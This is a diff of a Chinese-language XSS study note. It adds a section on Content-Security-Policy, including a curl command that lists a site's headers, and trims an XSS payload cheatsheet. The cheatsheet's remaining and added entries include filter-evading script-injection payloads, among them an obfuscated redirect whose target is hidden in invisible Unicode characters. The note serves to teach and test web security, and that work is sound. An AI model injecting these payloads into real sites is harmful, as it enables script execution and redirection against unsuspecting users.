@@ -14,6 +14,7 @@ Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內
   
 *  [XSS detection](#xss-detection)  
 *  [常見限制 and 對抗手勢](#常見限制-and-對抗手勢)  
+*  [CSP介紹與繞過](#csp-into-and-bypass)  
 *  [正規表達式](#正規表達式)  
 *  [攻擊手勢](#攻擊手勢)  
 *  [popunder彈窗手勢](#彈窗手勢)  
@@ -69,7 +70,7 @@ preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])   // 大�
   String.fromCharCode() 將unicode字碼轉換成字串 [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
   eval() 執行參數中的js語句 [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
 * length limit  
-  * 外部引入自己的script `<script src=".js"></script>`  
+  外部引入自己的js  
 * 未過濾`\n`類符號  
 ```js
 <img src="javas
@@ -79,7 +80,20 @@ alert(/1/);">
 * XSS filters  
 * WAF  
 * HTML Sanitizer  
-* CSP(Content-Security-Policy)
+* CSP(Content-Security-Policy)  
+  這部分內容有點多，我還是獨立出來筆記好了:sweat:
+
+# CSP Intro and bypass
+從瀏覽器的層面來防禦漏洞  
+主要有兩種 1.限制`js`執行 2. 限制對別的域的請求  
+怎麼看一個網站的CSP呢？  
+```php
+curl -I https://github.com/
+// 列出header
+// 我們可以看到github已經開啟了XSS-Protection
+// 並且也能看到CSP的內容
+Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; connect-src 'self' uploads.github.com status.github.com collector.githubapp.com api.github.com www.google-analytics.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com wss://live.github.com; font-src assets-cdn.github.com; form-action 'self' github.com gist.github.com; frame-ancestors 'none'; frame-src render.githubusercontent.com; img-src 'self' data: assets-cdn.github.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com *.githubusercontent.com; manifest-src 'self'; media-src 'none'; script-src assets-cdn.github.com; style-src 'unsafe-inline' assets-cdn.github.com
+```
 
 # 正規表達式
 js中會用正規表達式來過濾危險字符  
@@ -146,33 +160,21 @@ onkeypress=function(){
 # Cheatsheet
 ```php
 </script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>         // 協議解析
-</script>"><script>prompt(1)</script>
 </ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
 "><script>al\u0065rt(document.domain)</script>
 "><script>al\u{65}rt(document.domain)</script>
 "><img src=x onerror=prompt(1)>
 "><svg/onload=prompt(1)>
-"><iframe/src=javascript:prompt(1)>
-"><h1 onclick=prompt(1)>Clickme</h1>
-"><a href=javascript:prompt(1)>Clickme</a>
-"><a href="javascript:confirm%28 1%29">Clickme</a>
-"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
-"><textarea autofocus onfocus=prompt(1)>
 "><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
-"><script>co\u006efir\u006d`1`</script>
-"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
-"><img src=x onerror=co\u006efir\u006d`1`>
-"><svg/onload=co\u006efir\u006d`1`>
-"><iframe/src=javascript:co\u006efir\u006d%28 1%29>
-"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
-"><a href=javascript:prompt%28 1%29>Clickme</a>
-"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
-"><textarea autofocus onfocus=co\u006efir\u006d(1)>
-"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
-"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
-"><img/src=x%0Aonerror=prompt`1`>
-"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
-"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
+
+// document.write take multiple arguments
+document.write("<s","crip","t>al","ert(","1)","</s","cript>")
+
+// Unicode-based
+location='http://\u{e01cc}\u{e01cd}\u{e01ce}\u{e01cf}\u{e01d0}\u{e01d1}\u{e01d2}\u{e01d3}\u{e01d4}\u{e01d5}google\u{e01da}\u{e01db}\u{e01dc}\u{e01dd}\u{e01de}\u{e01df}.com'
+
+// redirection
+atob.constructor(unescape([...escape((𐑬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄽󠄧󠅨󠅴󠅴󠅰󠄺󠄯󠄯󠅩󠅢󠅭󠄮󠅣󠅯󠅭󠄧=ﾠ=>ﾠ).name)].filter((ﾠ,ㅤ)=>ㅤ%12<1|ㅤ%12>9).join([])))()
 ```
 上面的cheatsheet除了有brutexss原有的payload還有一些自己蒐集的!  
 [Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  
